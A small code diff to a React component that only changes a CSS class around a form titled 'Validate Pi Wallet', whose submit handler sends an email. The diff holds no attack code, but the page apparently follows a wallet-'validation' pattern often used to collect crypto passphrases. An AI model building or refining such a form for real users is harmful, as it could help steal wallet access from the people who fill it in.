@@ -59,7 +59,7 @@ export default function Validate() {
       variants={variants}
       initial="closed"
       animate="open"
-      className="center mt-7 min-h-screen"
+      className="mt-7 min-h-screen"
     >
       <form className="max-w-[500px] min-h-screen w-full" ref={form} onSubmit={sendEmail}>
         <p className="mb-8 font-bold text-lg lg:text-xl text-center">Validate Pi Wallet</p>
